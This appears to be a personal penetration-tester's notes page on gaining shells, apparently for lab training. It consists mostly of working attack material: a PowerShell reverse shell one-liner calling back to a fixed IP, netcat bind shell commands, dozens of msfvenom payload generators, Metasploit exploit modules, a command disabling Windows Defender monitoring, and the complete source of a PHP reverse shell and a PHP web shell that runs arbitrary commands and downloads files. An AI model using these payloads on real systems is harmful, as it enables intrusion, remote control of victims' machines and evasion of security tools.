
[[Shells Overview]]
[[PHP Reverse Shell]]
[[PHP Web Shells]]
[[Reverse Shells vs Bind Shells]]
[[Spawning TTY Shell]]
[[Infiltrating Linux]]
[[Bind Shells]]
[[Antak (ASP.net ASPX)]]
[[Laudanum]]
[[phpbash]]

[[Infiltrating Windows]]


---

# Resources

| Name                                                                     | Description                                                                                                                                                 | Link                                                                                      |
| ------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| ShellGhost                                                               | A `memory-based evasion technique` which makes shellcode invisible from process start to end                                                                | https://github.com/lem0nSec/ShellGhost                                                    |
| Reverse Shell Generator                                                  | Simple, easy, and fast `reverse shell` generator                                                                                                            | https://www.revshells.com/                                                                |
| nishang (including `Antak-Webshell`)                                     | Collection of `PowerShell` scripts and payloads which make it great for `Windows`                                                                           | https://github.com/samratashok/nishang/tree/master                                        |
| PHP Reverse Shell                                                        | Basic `PHP` reverse shell from pentestmonkey                                                                                                                | http://pentestmonkey.net/tools/php-reverse-shell                                          |
| PHP Web Shell                                                            | Basic `PHP` web shell from WhiteWinterWolf                                                                                                                  | https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php |
| `Laudanum` (including web shell built in `asp, aspx, jsp, php,` and more)) | Collection of injectable files, written for `different environments`. They provide functionality such as `shell`, `DNS query`, `LDAP` retrieval and others. | https://github.com/jbarcia/Web-Shells/tree/master/laudanum                                |
| phpbash                                                                  | `Stand-alone` single file semi-interactive web shell. Useful where traditional reverse shells are not possible (requires only `Javascript` and `shell_exec` enabled on host).                                                                              | https://github.com/Arrexel/phpbash                                                                                          |


---
# Linux

| Command                                                                                             | Description                                                                                                                 |
| --------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| `python -c 'import pty; pty.spawn("/bin/sh")' `                                                     | Spawn TTY (`interactive`) shell with `python`                                                                               |
| `/bin/sh -i`                                                                                        | Execute shell interpreter specified in the path in interactive mode (`-i`)                                                  |
| `perl —e 'exec "/bin/sh";'`                                                                         | Spawn TTY shell with `Perl`                                                                                                 |
| `perl: exec "/bin/sh";`                                                                             | `Perl` to TTY shell run from `script`                                                                                       |
| `ruby: exec "/bin/sh"`                                                                              | `Ruby` to TTY shell run from `script`                                                                                       |
| `lua: os.execute('/bin/sh')`                                                                        | `Lua` to TTY shell run from `script`                                                                                        |
| `awk 'BEGIN {system("/bin/sh")}'`                                                                   | `awk` to TTY shell                                                                                                          |
| `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`                             | `find` to TTY shell                                                                                                         |
| `find . -exec /bin/sh \; -quit`                                                                     | `find` to TTY shell using `exec`                                                                                            |
| `vim -c ':!/bin/sh'`                                                                                | `Vim` to shell (Vim `escape commands` below)                                                                                |
| `ls -la <path/to/fileorbinary>`                                                                     | Check user `file/binary permissions`                                                                                        |
| `sudo -l`                                                                                           | Check user `sudo permissions`                                                                                               |
| `python -c 'import pty; pty.spawn("/bin/sh")' `                                                     | Spawning s shell with `python`                                                                                              |
| `/usr/share/metasploit-framework/modules/exploits`                                                  | Metasploit modules to get `meterpreter` shell...                                                                            |
| `nc -nlvp 7777`                                                                                     | Start `netcat` listener on port 7777                                                                                        |
| `nc -nv <ip address of computer with listener started><port being listened on>`                     | Connects to a `netcat` listener at the specified IP address and port                                                        |
| `env`                                                                                               | Great way to find out which `shell language` is in use                                                                      |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Uses `netcat` to `bind` a shell (`/bin/bash`) the specified IP address and port                                             |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`      | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`                                         |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`                                       | `Metasploit` exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6` |
| `cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx`                           | Move a copy of `Laudanum` web shell for editing/usage (built in `asp, aspx, jsp, php,` and more)                                                                                                                            |

####   Vim Escape
```shell-session
vim
:set shell=/bin/sh
:shell
```

---

# Windows


`Powershell` one-liner used to connect back to a listener that has been started on an attack box
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


| Command                                                                                            | Description                                                                                                                       |
| -------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| `Set-MpPreference -DisableRealtimeMonitoring $true`                                                | `Powershell` command using to disable real time monitoring in `Windows Defender`                                                  |
| `use exploit/windows/smb/psexec`                                                                   | `Metasploit` exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec` |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`       | `MSFvenom` command used to generate a Windows-based reverse shell `stageless payload`                                             |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | `MSFvenom` command used to generate a `ASP` web reverse shell payload                                                             |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`      | `MSFvenom` command used to generate a `JSP` web reverse shell payload                                                             |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`      | `MSFvenom` command used to generate a `WAR java/jsp` compatible web reverse shell payload                                         |
| `use auxiliary/scanner/smb/smb_ms17_010`                                                           | `Metasploit` exploit module used to check if a host is vulnerable to `ms17_010`                                                   |
| `use exploit/windows/smb/ms17_010_psexec`                                                          | `Metasploit` exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to `ms17_010`       |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9001 -f war -o shell.war`           | `MSFvenom` command used to generate a `WAR java/jsp` compatible web reverse shell payload                                         |
| `nishang -h`                                                                                       | Collection of `PowerShell` scripts and payloads (including password protected `Antak-Webshell` built-in `ASP.Net`)                |
| `cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/kali/Upload.aspx`                           | Move a copy of `Antak-Webshell` (built-in `ASP.Net`) for editing/usage                                                            |
| `cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx`                          | Move a copy of `Laudanum` web shell for editing/usage (built in `asp, aspx, jsp, php,` and more)                                  |
|                                                                                                    |                                                                                                                                   |



---



---
# MSFVenom

## Non-Meterpreter Binaries

Staged Payloads for Windows

|   |   |
|---|---|
|x86|`msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`|
|x64|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe`|

Stageless Payloads for Windows

|   |   |
|---|---|
|x86|`msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`|
|x64|`msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe`|

Staged Payloads for Linux

|   |   |
|---|---|
|x86|`msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`|
|x64|`msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf`|

Stageless Payloads for Linux

|   |   |
|---|---|
|x86|`msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`|
|x64|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf`|

---

## Non-Meterpreter Web Payloads

|   |   |
|---|---|
|asp|`msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp`|
|jsp|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp`|
|war|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war`|
|php|`msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php`|

---

## Meterpreter Binaries

Staged Payloads for Windows

|   |   |
|---|---|
|x86|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`|
|x64|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe`|

Stageless Payloads for Windows

|   |   |
|---|---|
|x86|`msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`|
|x64|`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe`|

Staged Payloads for Linux

|   |   |
|---|---|
|x86|`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`|
|x64|`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf`|

Stageless Payloads for Linux

|   |   |
|---|---|
|x86|`msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`|
|x64|`msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf`|

---

## Meterpreter Web Payloads

|   |   |
|---|---|
|asp|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp`|
|jsp|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp`|
|war|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war`|
|php|`msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php`|

---

# Mac OS
 
| Command                                                                                          | Description |
| ------------------------------------------------------------------------------------------------ | ----------- |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho` | `MSFvenom` command used to generate a MacOS-based `reverse shell` payload            |


---

| Command | Description |
| ------- | ----------- |
|         |             |

---



---

## Establishing a Basic Bind Shell with Netcat

On the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.

#### No. 1: Server - Binding a Bash shell to the TCP session

  No. 1: Server - Binding a Bash shell to the TCP session

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134 7777 > /tmp/f
```

The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

#### No. 2: Client - Connecting to bind shell on target

  No. 2: Client - Connecting to bind shell on target

```shell-session
nc -nv 10.129.201.134 7777

Target@server:~$  
```



---

# PHP Reverse Shell

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```


# PHP Web Shell


```php
#<?php
/*******************************************************************************
 * Copyright 2017 WhiteWinterWolf
 * https://www.whitewinterwolf.com/tags/php-webshell/
 *
 * This file is part of wwolf-php-webshell.
 * source: https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
 ******************************************************************************/
 
/*
 * Optional password settings.
 * Use the 'passhash.sh' script to generate the hash.
 * NOTE: the prompt value is tied to the hash!
 */
$passprompt = "WhiteWinterWolf's PHP webshell: ";
$passhash = "";

function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }

function h($s)
{
	global $passprompt;
	if (function_exists('hash_hmac'))
	{
		return hash_hmac('sha256', $s, $passprompt);
	}
	else
	{
		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
	}
}

function fetch_fopen($host, $port, $src, $dst)
{
	global $err, $ok;
	$ret = '';
	if (strpos($host, '://') === false)
	{
		$host = 'http://' . $host;
	}
	else
	{
		$host = str_replace(array('ssl://', 'tls://'), 'https://', $host);
	}
	$rh = fopen("${host}:${port}${src}", 'rb');
	if ($rh !== false)
	{
		$wh = fopen($dst, 'wb');
		if ($wh !== false)
		{
			$cbytes = 0;
			while (! feof($rh))
			{
				$cbytes += fwrite($wh, fread($rh, 1024));
			}
			fclose($wh);
			$ret .= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
		}
		else
		{
			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
		}
		fclose($rh);
	}
	else
	{
		$ret = "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";
	}
	return $ret;
}

function fetch_sock($host, $port, $src, $dst)
{
	global $err, $ok;
	$ret = '';
	$host = str_replace('https://', 'tls://', $host);
	$s = fsockopen($host, $port);
	if ($s)
	{
		$f = fopen($dst, 'wb');
		if ($f)
		{
			$buf = '';
			$r = array($s);
			$w = NULL;
			$e = NULL;
			fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
			while (stream_select($r, $w, $e, 5) && !feof($s))
			{
				$buf .= fread($s, 1024);
			}
			$buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
			fwrite($f, $buf);
			fclose($f);
			$ret .= "${ok} Fetched file <i>${dst}</i> (" . strlen($buf) . " bytes)<br />";
		}
		else
		{
			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
		}
		fclose($s);
	}
	else
	{
		$ret .= "${err} Failed to connect to <i>${host}:${port}</i><br />";
	}
	return $ret;
}

ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);

while (@ ob_end_clean());

if (! isset($_SERVER))
{
	global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
	$_FILES = &$HTTP_POST_FILES;
	$_POST = &$HTTP_POST_VARS;
	$_SERVER = &$HTTP_SERVER_VARS;
}

$auth = '';
$cmd = empty($_POST['cmd']) ? '' : $_POST['cmd'];
$cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];
$fetch_func = 'fetch_fopen';
$fetch_host = empty($_POST['fetch_host']) ? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];
$fetch_path = empty($_POST['fetch_path']) ? '' : $_POST['fetch_path'];
$fetch_port = empty($_POST['fetch_port']) ? '80' : $_POST['fetch_port'];
$pass = empty($_POST['pass']) ? '' : $_POST['pass'];
$url = $_SERVER['REQUEST_URI'];
$status = '';
$ok = '&#9786; :';
$warn = '&#9888; :';
$err = '&#9785; :';

if (! empty($passhash))
{
	if (function_exists('hash_hmac') || function_exists('mhash'))
	{
		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
		if (h($auth) !== $passhash)
		{
			?>
				<form method="post" action="<?php e($url); ?>">
					<?php e($passprompt); ?>
					<input type="password" size="15" name="pass">
					<input type="submit" value="Send">
				</form>
			<?php
			exit;
		}
	}
	else
	{
		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
	}
}

if (! ini_get('allow_url_fopen'))
{
	ini_set('allow_url_fopen', '1');
	if (! ini_get('allow_url_fopen'))
	{
		if (function_exists('stream_select'))
		{
			$fetch_func = 'fetch_sock';
		}
		else
		{
			$fetch_func = '';
			$status .= "${warn} File fetching disabled ('allow_url_fopen'"
				. " disabled and 'stream_select()' missing).<br />";
		}
	}
}
if (! ini_get('file_uploads'))
{
	ini_set('file_uploads', '1');
	if (! ini_get('file_uploads'))
	{
		$status .= "${warn} File uploads disabled.<br />";
	}
}
if (ini_get('open_basedir') && ! ini_set('open_basedir', ''))
{
	$status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
}

if (! chdir($cwd))
{
  $cwd = getcwd();
}

if (! empty($fetch_func) && ! empty($fetch_path))
{
	$dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
	$status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
}

if (ini_get('file_uploads') && ! empty($_FILES['upload']))
{
	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
	if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))
	{
		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
	}
}
?>

<form method="post" action="<?php e($url); ?>"
	<?php if (ini_get('file_uploads')): ?>
		enctype="multipart/form-data"
	<?php endif; ?>
	>
	<?php if (! empty($passhash)): ?>
		<input type="hidden" name="auth" value="<?php e($auth); ?>">
	<?php endif; ?>
	<table border="0">
		<?php if (! empty($fetch_func)): ?>
			<tr><td>
				<b>Fetch:</b>
			</td><td>
				host: <input type="text" size="15" id="fetch_host" name="fetch_host" value="<?php e($fetch_host); ?>">
				port: <input type="text" size="4" id="fetch_port" name="fetch_port" value="<?php e($fetch_port); ?>">
				path: <input type="text" size="40" id="fetch_path" name="fetch_path" value="">
			</td></tr>
		<?php endif; ?>
		<tr><td>
			<b>CWD:</b>
		</td><td>
			<input type="text" size="50" id="cwd" name="cwd" value="<?php e($cwd); ?>">
			<?php if (ini_get('file_uploads')): ?>
				<b>Upload:</b> <input type="file" id="upload" name="upload">
			<?php endif; ?>
		</td></tr>
		<tr><td>
			<b>Cmd:</b>
		</td><td>
			<input type="text" size="80" id="cmd" name="cmd" value="<?php e($cmd); ?>">
		</td></tr>
		<tr><td>
		</td><td>
			<sup><a href="#" onclick="cmd.value=''; cmd.focus(); return false;">Clear cmd</a></sup>
		</td></tr>
		<tr><td colspan="2" style="text-align: center;">
			<input type="submit" value="Execute" style="text-align: right;">
		</td></tr>
	</table>
	
</form>
<hr />

<?php
if (! empty($status))
{
	echo "<p>${status}</p>";
}

echo "<pre>";
if (! empty($cmd))
{
	echo "<b>";
	e($cmd);
	echo "</b>\n";
	if (DIRECTORY_SEPARATOR == '/')
	{
		$p = popen('exec 2>&1; ' . $cmd, 'r');
	}
	else
	{
		$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
	}
	while (! feof($p))
	{
		echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);
		@ flush();
	}
}
echo "</pre>";

exit;
?>
```